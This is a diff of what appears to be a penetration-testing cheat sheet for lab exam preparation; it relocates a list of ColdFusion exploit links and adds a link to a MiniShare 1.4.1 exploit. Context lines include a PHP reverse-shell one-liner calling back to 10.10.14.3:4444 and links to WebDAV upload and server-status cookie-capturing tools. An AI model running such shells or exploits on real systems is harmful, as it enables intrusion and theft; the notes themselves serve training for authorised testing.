@@ -297,11 +297,6 @@ Denied from accessing /robots.txt?
 Exploit code not working? Try:
 * Full directory paths to binaries and your files e.g. `/usr/bin/wget http:example.com -o /full/path/to/file.txt`
 
-ColdFusion vulns
-* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
-* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
-* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/
-
 WEBDAV vulns - using tools . 
 https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
 http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
@@ -347,6 +342,14 @@ $ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 Apache
 * Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.
+
+ColdFusion vulns
+* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
+* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
+* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/
+
+MiniShare HTTP Server 1.4.1
+* https://github.com/codingo/OSCP-2/blob/master/Exploits/MS_v1.4.1.py
 
 # INITIAL EXPLOITATION
 
